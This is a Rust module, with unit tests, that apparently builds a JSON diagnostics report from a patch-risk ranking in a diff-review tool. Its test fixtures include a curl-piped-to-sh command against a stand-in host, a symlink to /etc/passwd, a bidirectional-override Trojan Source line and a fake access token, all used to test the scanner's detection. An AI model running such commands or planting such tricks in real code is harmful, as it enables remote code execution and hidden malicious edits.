//! `deep-diff-forge.diagnostics.v0` (`docs/reference/diagnostics.md`): every label a ranking
//! raises, at the evidence row that locates it or at its file. Built from the ranking alone: it
//! holds no text of the change but each path, and says nothing `rank.v0` does not.

use crate::evidence::Side;
use crate::rank::RankedFile;
use crate::risk::RiskSignal;
use crate::vocabulary::{facts, remedy};
use deep_diff_forge_core::{InputSeal, is_unsafe_in_untrusted_text, json_escape, sha256_hex};
use std::collections::{BTreeMap, HashMap};
use std::fmt::Write as _;

/// One label of one ranked file, at an evidence row (`at`: side and line) or at the file.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnostic {
    pub key: String,
    pub code: String,
    pub signal: RiskSignal,
    pub path: String,
    pub at: Option<(Side, u32)>,
    /// How many earlier diagnostics have the same path, label, anchor, side and line.
    pub occurrence: u32,
    /// A reading of this version finds it (`current`); else `floor_only`.
    pub current: bool,
    /// The row's `test_likely`; written on `panic_path_added@line` only.
    pub test_likely: bool,
}

/// A `deep-diff-forge.diagnostics.v0` document; `cut` is `{path, rows_kept}` in rank order.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Diagnostics {
    pub seal: InputSeal,
    pub files: usize,
    pub cut: Vec<(String, usize)>,
    pub diagnostics: Vec<Diagnostic>,
}

/// `<label>@line` or `<label>@file`; only an evidence row locates a label at a line.
#[must_use]
pub fn code_of(signal: RiskSignal, line: bool) -> Option<String> {
    let anchor = if line { "line" } else { "file" };
    (!line || matches!(signal, RiskSignal::Code(_))).then(|| format!("{}@{anchor}", signal.label()))
}

/// The diagnostics of `ranked`, the ranking of the input `seal` seals, in its order: per file,
/// one `@line` per evidence row in the list's order, then one `@file` per label of `signals`
/// no row locates, in that order.
#[must_use]
pub fn diagnostics(seal: &InputSeal, ranked: &[RankedFile]) -> Diagnostics {
    let mut seen = HashMap::new();
    let mut out = Vec::new();
    for file in ranked {
        let row = |e: &crate::Evidence| (RiskSignal::Code(e.signal), Some((e.side, e.line)));
        let rows = file
            .evidence
            .iter()
            .map(|e| (row(e), e.read_now, e.test_likely));
        let located = |s: &RiskSignal| file.evidence.iter().any(|e| row(e).0 == *s);
        let floor =
            |s: RiskSignal| matches!(s, RiskSignal::Code(e) if file.floor_only.contains(&e));
        let unlocated = file.signals.iter().filter(|s| !located(s));
        for ((signal, at), current, test_likely) in
            rows.chain(unlocated.map(|&s| ((s, None), !floor(s), false)))
        {
            let seen = seen.entry((&file.path, signal.label(), at)).or_insert(0);
            let (occurrence, code) = (*seen, code_of(signal, at.is_some()).unwrap_or_default());
            *seen += 1;
            out.push(Diagnostic {
                key: key(&seal.input_sha256, &file.path, &code, at, occurrence),
                code,
                signal,
                path: file.path.clone(),
                at,
                occurrence,
                current,
                test_likely,
            });
        }
    }
    let cut = ranked.iter().filter(|f| f.evidence_truncated);
    let cut = cut.map(|f| (f.path.clone(), f.evidence.len())).collect();
    let (seal, files) = (seal.clone(), ranked.len());
    Diagnostics {
        seal,
        files,
        cut,
        diagnostics: out,
    }
}

/// SHA-256 of `ddf-diagnostic-v0`, input digest, path, label, anchor, side, line, occurrence,
/// NUL between each: no line text, no hunk address.
fn key(input: &str, path: &str, code: &str, at: Option<(Side, u32)>, occurrence: u32) -> String {
    let (label, anchor) = code.split_once('@').unwrap_or((code, ""));
    let (side, line) = at.map_or((String::new(), String::new()), |(s, n)| {
        (s.label().into(), n.to_string())
    });
    let text = format!(
        "ddf-diagnostic-v0\0{input}\0{path}\0{label}\0{anchor}\0{side}\0{line}\0{occurrence}"
    );
    sha256_hex(text.as_bytes())
}

/// [`json_escape`], and each bidi or invisible character as `\uXXXX` (a pair above U+FFFF), so
/// a path cannot reorder or hide text where it is shown.
fn safe(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    for c in json_escape(value).chars() {
        if is_unsafe_in_untrusted_text(c) {
            for unit in c.encode_utf16(&mut [0; 2]) {
                let _ = write!(out, "\\u{unit:04x}");
            }
        } else {
            out.push(c);
        }
    }
    out
}

/// A JSON list or object body, one item a line, as `rank.v0` writes its entries.
fn block(items: &[String], open: char, close: char) -> String {
    if items.is_empty() {
        return format!("{open}{close}");
    }
    format!("{open}\n    {}\n  {close}", items.join(",\n    "))
}

impl Diagnostic {
    /// The diagnostic as the document writes it; the ids it names go into `texts` with their
    /// agent-facing text. A `floor_only` reading is for a person and names none.
    fn to_json(&self, texts: &mut BTreeMap<&'static str, &'static str>) -> String {
        let remedy = remedy(self.signal);
        let (accept, not, reading, audience): (&[&str], &[_], _, _) = if self.current {
            (remedy.accept_ids, remedy.not_accepted, "current", "agent")
        } else {
            (&[], &[], "floor_only", "person")
        };
        let mut name = |id: &'static str, text: &'static str| {
            texts.insert(id, text);
            format!("\"{id}\"")
        };
        let repairs: Vec<String> = accept
            .iter()
            .zip(remedy.accept)
            .map(|(id, t)| name(id, t))
            .collect();
        let not: Vec<String> = not
            .iter()
            .filter_map(|n| Some(name(n.id, n.agent?)))
            .collect();
        let (label, class) = (self.signal.label(), facts(self.signal).class.label());
        let (anchor, side, line) = self
            .at
            .map_or(("file", "null".into(), "null".into()), |(s, n)| {
                ("line", format!("\"{}\"", s.label()), n.to_string())
            });
        let likely = if self.code == "panic_path_added@line" {
            format!(", \"test_likely\": {}", self.test_likely)
        } else {
            String::new()
        };
        format!(
            "{{\"key\": \"{}\", \"code\": \"{}\", \"label\": \"{label}\", \"class\": \"{class}\", \"path\": {}, \"anchor\": \"{anchor}\", \"side\": {side}, \"line\": {line}, \"occurrence\": {}, \"reading\": \"{reading}\", \"audience\": \"{audience}\", \"repairs\": [{}], \"not_accepted\": [{}]{likely}}}",
            self.key,
            self.code,
            safe(&self.path),
            self.occurrence,
            repairs.join(", "),
            not.join(", "),
        )
    }
}

impl Diagnostics {
    /// The canonical bytes: schema first, members in the contract's order, two-space indent,
    /// one item a line. `judge` is `unknown`: no producer of this document runs a judge yet.
    #[must_use]
    pub fn to_json(&self) -> String {
        let mut texts = BTreeMap::new();
        let items: Vec<String> = self
            .diagnostics
            .iter()
            .map(|d| d.to_json(&mut texts))
            .collect();
        let agent = self.diagnostics.iter().filter(|d| d.current).count();
        let cut = self
            .cut
            .iter()
            .map(|(p, n)| format!("{{\"path\": {}, \"rows_kept\": {n}}}", safe(p)));
        let texts: Vec<String> = texts
            .iter()
            .map(|(id, t)| format!("\"{id}\": {}", safe(t)))
            .collect();
        format!(
            "{{\n  \"schema\": \"deep-diff-forge.diagnostics.v0\",\n  \"input_sha256\": \"{}\",\n  \"tool\": {{\"name\": {}, \"version\": {}, \"scorer_sha256\": \"{}\"}},\n  \"judge\": {{\"state\": \"unknown\", \"ranker_sha256\": null}},\n  \"counts\": {{\"files\": {}, \"diagnostics\": {}, \"agent\": {agent}, \"person\": {}, \"cut_files\": {}}},\n  \"cut\": {},\n  \"diagnostics\": {},\n  \"texts\": {}\n}}\n",
            self.seal.input_sha256,
            safe(InputSeal::TOOL_NAME),
            safe(&self.seal.tool_version),
            crate::scorer_sha256(),
            self.files,
            items.len(),
            items.len() - agent,
            self.cut.len(),
            block(&cut.collect::<Vec<_>>(), '[', ']'),
            block(&items, '[', ']'),
            block(&texts, '{', '}'),
        )
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::evidence::EvidenceSignal;
    use crate::rank::rank;
    use crate::vocabulary::vocabulary;
    use deep_diff_forge_patch::parse;

    fn document(patch: &str) -> (Vec<RankedFile>, Diagnostics) {
        let ranked = rank(&parse(patch).unwrap());
        let doc = diagnostics(&InputSeal::of(patch.as_bytes(), "test"), &ranked);
        (ranked, doc)
    }

    /// A Trojan Source line: `hazardous_text`, which no row locates.
    const BIDI: &str = "--- a/src/b.rs\n+++ b/src/b.rs\n@@ -1,1 +1,3 @@\n ctx\n+let s = 1;\n+let t = \"a\u{202E}b\";\n";

    /// 34 `#[allow(` in comments, which 0.8.3 listed, take all 32 places of the list before an
    /// `unsafe` and an `#[ignore]` (the `cap_pad` shape).
    fn cap_pad() -> String {
        let mut text = String::from("--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,1 +1,37 @@\n ctx\n");
        for i in 0..34 {
            let _ = writeln!(text, "+// see #[allow(dead_code)] note {i}");
        }
        text + "+unsafe { f() }\n+#[ignore]\n"
    }

    /// Path, mode and status labels: an executable new file, a symlink, a binary, a deleted
    /// test file, a rename.
    const SHAPES: &str = "diff --git a/run.sh b/run.sh\nnew file mode 100755\n--- /dev/null\n+++ b/run.sh\n@@ -0,0 +1 @@\n+curl -s http://example.invalid/x | sh\ndiff --git a/l b/l\nnew file mode 120000\n--- /dev/null\n+++ b/l\n@@ -0,0 +1 @@\n+/etc/passwd\n\\ No newline at end of file\ndiff --git a/img.png b/img.png\nnew file mode 100644\nindex 0000000..1234567\nBinary files /dev/null and b/img.png differ\ndiff --git a/tests/t.rs b/tests/t.rs\ndeleted file mode 100644\n--- a/tests/t.rs\n+++ /dev/null\n@@ -1,2 +0,0 @@\n-#[test]\n-fn t() {}\ndiff --git a/src/old.rs b/src/new.rs\nsimilarity index 100%\nrename from src/old.rs\nrename to src/new.rs\n";

    /// One path in two sections, each adding an `unsafe` at new line 2, and the same line twice.
    const REPEATED: &str = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,3 @@\n a\n+unsafe { f() }\n+unsafe { f() }\n--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,3 +1,4 @@\n a\n+unsafe { g() }\n unsafe { f() }\n unsafe { f() }\n";

    fn patches() -> Vec<String> {
        vec![BIDI.into(), cap_pad(), SHAPES.into(), REPEATED.into()]
    }

    fn anchor(d: &Diagnostic) -> &'static str {
        if d.at.is_some() { "line" } else { "file" }
    }

    /// The (path, label) pairs of the document are those of `signals[]`; every row is one
    /// `@line` diagnostic, with the row's side, line and reading, in the list's order; each
    /// other label of a file is one `@file` diagnostic after its rows.
    #[test]
    fn diagnostics_cover_every_signal_and_every_row() {
        for patch in patches() {
            let (ranked, doc) = document(&patch);
            let mut rest = doc.diagnostics.iter();
            for file in &ranked {
                for signal in &file.signals {
                    assert!(
                        doc.diagnostics
                            .iter()
                            .any(|d| d.path == file.path && d.signal == *signal),
                        "{} of {} has no diagnostic",
                        signal.label(),
                        file.path
                    );
                }
                for row in &file.evidence {
                    let d = rest.next().expect("a diagnostic for every row");
                    let found = (&d.path, d.signal, d.at, d.current, anchor(d));
                    let at = Some((row.side, row.line));
                    let want = (
                        &file.path,
                        RiskSignal::Code(row.signal),
                        at,
                        row.read_now,
                        "line",
                    );
                    assert_eq!(found, want, "{patch}");
                }
                let located = |s: &RiskSignal| {
                    file.evidence
                        .iter()
                        .any(|e| RiskSignal::Code(e.signal) == *s)
                };
                for signal in file.signals.iter().filter(|s| !located(s)) {
                    let d = rest
                        .next()
                        .unwrap_or_else(|| panic!("{}: no @file", signal.label()));
                    assert_eq!(
                        (&d.path, d.signal, d.at),
                        (&file.path, *signal, None),
                        "{patch}"
                    );
                }
            }
            assert_eq!(rest.next(), None, "a diagnostic of no signal: {patch}");
            assert_eq!(doc.files, ranked.len());
        }
        let (ranked, doc) = document(BIDI);
        assert_eq!(ranked[0].evidence, []);
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        assert!(codes.contains(&"hazardous_text@file"), "{codes:?}");
        let (ranked, doc) = document(&cap_pad());
        assert!(
            ranked[0]
                .evidence
                .iter()
                .all(|e| e.signal == EvidenceSignal::CheckSuppressed)
        );
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        for code in ["unsafe_added@file", "test_skipped@file"] {
            assert!(codes.contains(&code), "{code} of the cut file: {codes:?}");
        }
        assert_eq!(doc.cut, [("src/a.rs".to_owned(), 32)]);
        assert!(
            doc.to_json()
                .contains("\"cut\": [\n    {\"path\": \"src/a.rs\", \"rows_kept\": 32}\n  ]")
        );
    }

    /// A code is the label and the diagnostic's own anchor, in the document as in the type, and
    /// every code is in the pinned table.
    #[test]
    fn every_code_is_its_label_at_its_anchor() {
        let pinned = codes_v0();
        for patch in patches() {
            let doc = document(&patch).1;
            let json = doc.to_json();
            for d in &doc.diagnostics {
                let code = format!("{}@{}", d.signal.label(), anchor(d));
                assert_eq!(d.code, code, "{patch}");
                assert!(pinned.contains(&code), "{code} is not pinned");
                let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
                let label = d.signal.label();
                for member in [
                    format!("\"code\": \"{code}\", \"label\": \"{label}\""),
                    format!("\"anchor\": \"{}\"", anchor(d)),
                ] {
                    assert!(written.contains(&member), "{member} not in {written}");
                }
                assert!(
                    d.at.is_none() || matches!(d.signal, RiskSignal::Code(_)),
                    "{code}"
                );
            }
        }
    }

    fn codes_v0() -> Vec<String> {
        let path = concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../fixtures/diagnostics/codes.v0.txt"
        );
        std::fs::read_to_string(path)
            .unwrap()
            .lines()
            .map(str::to_owned)
            .collect()
    }

    /// The codes the builder can make are the pinned table, but `hazardous_text@line`, which
    /// F1.a2 adds (a line from `core::text_hazards`); until then that label is at its file.
    #[test]
    fn the_code_table_matches_the_builder() {
        let mut made: Vec<String> = vocabulary()
            .iter()
            .flat_map(|f| [code_of(f.signal, true), code_of(f.signal, false)])
            .flatten()
            .collect();
        let mut pinned = codes_v0();
        pinned.retain(|code| code != "hazardous_text@line");
        made.sort();
        pinned.sort();
        assert_eq!(made, pinned);
    }

    /// Every key is the SHA-256 of the members it is defined by, recomputed here, and the keys
    /// of a document differ: the same line in two sections of one path, and two equal lines.
    #[test]
    fn every_key_is_recomputed_from_its_members() {
        for patch in patches() {
            let doc = document(&patch).1;
            let json = doc.to_json();
            let mut keys = Vec::new();
            for d in &doc.diagnostics {
                let (side, line) = d.at.map_or((String::new(), String::new()), |(s, n)| {
                    (s.label().into(), n.to_string())
                });
                let fields = format!(
                    "ddf-diagnostic-v0\0{}\0{}\0{}\0{}\0{side}\0{line}\0{}",
                    doc.seal.input_sha256,
                    d.path,
                    d.signal.label(),
                    anchor(d),
                    d.occurrence
                );
                assert_eq!(d.key, sha256_hex(fields.as_bytes()), "{patch}");
                assert!(json.contains(&format!("{{\"key\": \"{}\"", d.key)));
                keys.push(d.key.clone());
            }
            keys.sort();
            keys.dedup();
            assert_eq!(keys.len(), doc.diagnostics.len(), "{patch}");
        }
    }

    /// The same `unsafe` line twice in one file, and the same line in two sections of a path:
    /// distinct keys, the second section's by its occurrence.
    #[test]
    fn identical_lines_in_one_file_get_distinct_keys() {
        let doc = document(REPEATED).1;
        let at_two: Vec<&Diagnostic> = doc
            .diagnostics
            .iter()
            .filter(|d| d.code == "unsafe_added@line" && d.at == Some((Side::New, 2)))
            .collect();
        assert_eq!(
            at_two.iter().map(|d| d.occurrence).collect::<Vec<_>>(),
            [0, 1]
        );
        assert_ne!(at_two[0].key, at_two[1].key);
        let lines: Vec<_> = doc.diagnostics.iter().filter(|d| d.at.is_some()).collect();
        assert!(lines.len() >= 3, "{lines:?}");
    }

    /// No text of a changed line reaches the document, and no hash of one: every 64-digit hex
    /// value in it is the input's, the scorer's or a key the document recomputes.
    #[test]
    fn the_canary_and_the_secret_are_never_copied() {
        let token = ["gl", "pat-", "AbCdEfGhIj", "KlMnOpQrSt"].concat();
        let canary = ["canary", "-7f3a91"].concat();
        let patch = format!(
            "--- a/src/k.rs\n+++ b/src/k.rs\n@@ -1,1 +1,3 @@ fn {canary}()\n ctx\n+let t = \"{token}\"; // {canary}\n+unsafe {{ {canary}() }}\n"
        );
        let doc = document(&patch).1;
        let json = doc.to_json();
        let codes: Vec<&str> = doc.diagnostics.iter().map(|d| d.code.as_str()).collect();
        assert!(codes.contains(&"secret_like@line"), "{codes:?}");
        for text in [&token, &canary, &"glpat".to_owned()] {
            assert!(!json.contains(text.as_str()), "{text} copied:\n{json}");
        }
        let known: Vec<&str> = [doc.seal.input_sha256.as_str(), crate::scorer_sha256()]
            .into_iter()
            .chain(doc.diagnostics.iter().map(|d| d.key.as_str()))
            .collect();
        let bytes = json.as_bytes();
        for (at, _) in json.char_indices() {
            let run = bytes[at..]
                .iter()
                .take_while(|b| b.is_ascii_hexdigit())
                .count();
            if run >= 64 && (at == 0 || !bytes[at - 1].is_ascii_hexdigit()) {
                let hex = &json[at..at + run];
                assert!(
                    known.contains(&hex),
                    "a 64-digit hex value the document cannot recompute: {hex}"
                );
            }
        }
    }

    /// The path is the only text of the change, and it cannot reorder or hide text: bidi and
    /// invisible characters are written as `\uXXXX`, a pair above U+FFFF.
    #[test]
    fn a_path_is_written_display_safe() {
        let name = "src/a\u{202E}b\u{200B}c\u{E0041}.rs";
        let patch = format!("--- a/{name}\n+++ b/{name}\n@@ -1,1 +1,2 @@\n a\n+unsafe {{ f() }}\n");
        let doc = document(&patch).1;
        assert_eq!(doc.diagnostics[0].path, name);
        let json = doc.to_json();
        assert!(
            json.contains("\"path\": \"src/a\\u202eb\\u200bc\\udb40\\udc41.rs\""),
            "{json}"
        );
        assert!(!json.contains('\u{202E}') && !json.contains('\u{200B}'));
    }

    /// The reading of a file's items in `patch` and of its diagnostics: (label, line, reading).
    fn readings(patch: &str) -> Vec<(&'static str, u32, bool, bool)> {
        let file = parse(patch).unwrap().remove(0);
        let doc = document(patch).1;
        for d in doc.diagnostics.iter().filter(|d| d.at.is_some()) {
            let reading = if d.current {
                "\"reading\": \"current\", \"audience\": \"agent\""
            } else {
                "\"reading\": \"floor_only\", \"audience\": \"person\", \"repairs\": [], \"not_accepted\": []"
            };
            let json = doc.to_json();
            let written = json.lines().find(|l| l.contains(&d.key)).unwrap();
            assert!(written.contains(reading), "{written}");
        }
        crate::evidence::file_evidence(&file)
            .iter()
            .map(|e| (e.signal.label(), e.line, e.released, e.read_now))
            .collect()
    }

    /// Outside Rust the hunk read alone is a current reading, though it is also how 0.8.3 read it
    /// (`released`): by reader, not by the mark.
    #[test]
    fn a_python_spawn_reads_current() {
        let patch = "--- a/run.py\n+++ b/run.py\n@@ -1,1 +1,2 @@\n import subprocess\n+subprocess.run([\"sh\"])\n";
        assert_eq!(readings(patch), [("process_spawn", 2, true, true)]);
    }

    #[test]
    fn rust_unsafe_in_code_reads_current() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n fn a() {}\n+fn b() { unsafe { c() } }\n";
        assert_eq!(readings(patch), [("unsafe_added", 2, true, true)]);
    }

    /// The readers of this version also read `#[allow(` in a Rust comment (the rule on the raw
    /// line, `#` then `[allow(`), so it is current, not only 0.8.3's.
    #[test]
    fn a_rust_allow_in_a_comment_reads_current() {
        let patch = "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,2 @@\n fn a() {}\n+// see #[allow(dead_code)]\n";
        assert_eq!(readings(patch), [("check_suppressed", 2, true, true)]);
    }

    /// An `unsafe` in a raw string over lines, which the scanner of release 0.8.3 took for code:
    /// only the reading of that release finds it (shape of the corpus's
    /// `hardening-review-20261118/deep/C/patches/260.patch`).
    #[test]
    fn an_unsafe_in_a_rust_raw_string_reads_floor_only() {
        let patch = "--- a/src/app.rs\n+++ b/src/app.rs\n@@ -1,2 +1,5 @@\n // ctx\n+    let s = r#\"\n+    unsafe { f() }\n+    \"#;\n // ctx\n";
        assert_eq!(readings(patch), [("unsafe_added", 3, true, false)]);
        let (ranked, doc) = document(patch);
        assert_eq!(ranked[0].floor_only, [EvidenceSignal::UnsafeAdded]);
        assert_eq!(doc.diagnostics[0].code, "unsafe_added@line");
        assert!(!doc.diagnostics[0].current);
        assert!(doc.to_json().contains("\"counts\": {\"files\": 1, \"diagnostics\": 1, \"agent\": 0, \"person\": 1, \"cut_files\": 0}"));
    }
}
